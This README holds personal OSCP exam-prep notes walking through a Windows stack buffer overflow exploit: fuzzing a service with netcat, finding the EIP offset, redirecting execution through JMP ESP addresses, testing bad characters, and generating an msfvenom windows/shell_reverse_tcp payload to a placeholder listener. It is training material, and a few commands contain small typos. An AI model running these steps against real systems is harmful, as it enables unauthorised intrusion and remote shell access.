# dostackbufferoverflow-POC

Some notes for my OSCP prep

## Requirements
These binaries are included in the Kali Linux Distribution. 
* netcat
* msf-pattern_create
* msf-pattern_offset
* msfvenom

## Finding the Offset

`$ msf-pattern_create -l 1000 |nc -w 1 $HOST $PORT`
once the program crashed, look at your Immunity Debugger on what the EIP value and put the value in msf-pattern_offset

$ msf-pattern_offset -l 200 -q 39654138
[*] Exact match at offset 146


## Overwriting the EIP
```
$ $(msf-pattern_create -l 146)$(echo "AAAA") |nc -w 1 $HOST $PORT
EIP: 414141
```

## Controlling the EIP

to identify which pointers use the OPCODE for JMP ESP
`!mona find -s '\xff\xe4"`
Note: \xFF\xe4 is the hex value for JMP ESP

in this case, 0x080414c3 and 0x080416bf are the ones that we are going to put in the EIP address,
convert the address values to little endian format

for example: 0x080414c3 turns into \xc3\x14\x04\x08

reset the executable in the Immunity Debugger
stop the JMP ESP address from executing by finding the return address 0x080414c3 or 0x080416bf using the right arrow and searching for the address and press f2
send the payload
`$ $(msf-pattern_create -l 146)$(echo -en '\xc3\x14\x04\x08') |nc -w 1 $HOST $PORT`

## Finding Bad Characters

Some characters may return bad output therefore reading your payload useless, to test for bad characters, send all bad characters after the EIP. \x00 is considered a bad character since it is a null byte.

`$(msf-pattern_create -l 146)$(echo -en '\xc3\x14\x04\x08')$(echo -en "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" |nc -w 1 $HOST $PORT`

## Finding the right modules

msfvenom has alot of payloads to choose from, to view them use `msfvenom --list payloads` choose a payload that suites you and the architecture.
for this box, ill be using the `windows/shell_reverse_tcp`
`msfvenom -p windows/shell_reverse_tcp -b '\x00\0x0A' -sh --var-name=poc LHOST=$LHOST LPORT=$LPORT`

and run the exploit, this repository includes the POC.sh


